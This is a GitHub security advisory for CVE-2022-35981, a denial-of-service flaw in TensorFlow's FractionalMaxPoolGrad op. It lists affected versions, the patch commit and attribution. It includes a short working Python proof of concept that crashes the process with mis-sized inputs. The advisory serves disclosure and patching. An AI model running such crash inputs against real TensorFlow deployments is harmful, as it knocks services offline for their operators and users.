# [M] TensorFlow vulnerable to `CHECK` fail in `FractionalMaxPoolGrad`

## Summary
Severity: Medium
Advisory: GHSA-vxv8-r8q2-63xw
CVE: CVE-2022-35981
CWE: CWE-617
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-vxv8-r8q2-63xw
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1

## Details
### Impact
`FractionalMaxPoolGrad` validates its inputs with `CHECK` failures instead of with returning errors. If it gets incorrectly sized inputs, the `CHECK` failure can be used to trigger a denial of service attack:
```python
import tensorflow as tf

overlapping = True
orig_input = tf.constant(.453409232, shape=[1,7,13,1], dtype=tf.float32)
orig_output = tf.constant(.453409232, shape=[1,7,13,1], dtype=tf.float32)
out_backprop = tf.constant(.453409232, shape=[1,7,13,1], dtype=tf.float32)
row_pooling_sequence = tf.constant(0, shape=[5], dtype=tf.int64)
col_pooling_sequence = tf.constant(0, shape=[5], dtype=tf.int64)
tf.raw_ops.FractionalMaxPoolGrad(orig_input=orig_input, orig_output=orig_output, out_backprop=out_backprop, row_pooling_sequence=row_pooling_sequence, col_pooling_sequence=col_pooling_sequence, overlapping=overlapping)
```

### Patches
We have patched the issue in GitHub commit [8741e57d163a079db05a7107a7609af70931def4](https://github.com/tensorflow/tensorflow/commit/8741e57d163a079db05a7107a7609af70931def4).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vxv8-r8q2-63xw
- https://nvd.nist.gov/vuln/detail/CVE-2022-35981
- https://github.com/tensorflow/tensorflow/commit/8741e57d163a079db05a7107a7609af70931def4
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
